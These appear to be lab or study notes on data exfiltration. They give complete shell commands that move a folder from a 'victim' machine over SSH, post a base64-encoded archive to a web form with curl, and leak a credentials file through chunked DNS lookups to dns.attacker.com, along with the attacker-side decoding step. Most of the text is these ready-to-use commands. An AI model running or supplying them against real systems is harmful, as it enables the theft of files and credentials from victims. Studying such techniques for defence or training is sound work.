### SSH
from the victim machine:\
`tar cf - <folder> | ssh <RED>@<IP> "cd /tmp/; tar xpf -"`
1. We used the tar command the same as the previous task to create an archive file of the <folder> directory.\
2. Then we passed the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session. \
3. We passed the command that must be executed in double quotations, "cd /tmp/; tar xpf. In this case, we change the directory and unarchive the passed file.

### HTTP POST
We imagine we have a contact.php on a web server that will store data somewhere on the machine\
`curl --data "file=$(tar zcf - <FOLDER> | base64)" http://the.web.server/contact.php`\
The main problem is that because of the http URL encoding, the base64 will be broken, so here is how fix it:\
`sudo sed -i 's/ /+/g' <file>

### DNS 
After have set up a dns record that point to the ATTACKER's machine we an send data through url\
Lets say we have a cred.txt with the data to exfiltrate.\
We first want to encode the file then send it using dns technique.\

`cat cred.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.dns.attacker.com/'`\
1. encode to b64
2. removed new line char
3. split the content in 18 char long
4. send request to attacker machine with partial content as many times as required

another way to do it single request\

`cat cred.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/dns.attacker.com/`\

Now from the victim machine:\
--- VICTIM ---
`cat cred.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/dns.attacker.com/ | awk '{print "dig +short " $1}' | bash`\

Then fro the attacker machine:\
`echo "baSE64.encodedDaaTA.SplIITed.ByDooOts.==" | cut -d"." -f1-8 | tr -d "." | base64 -d`


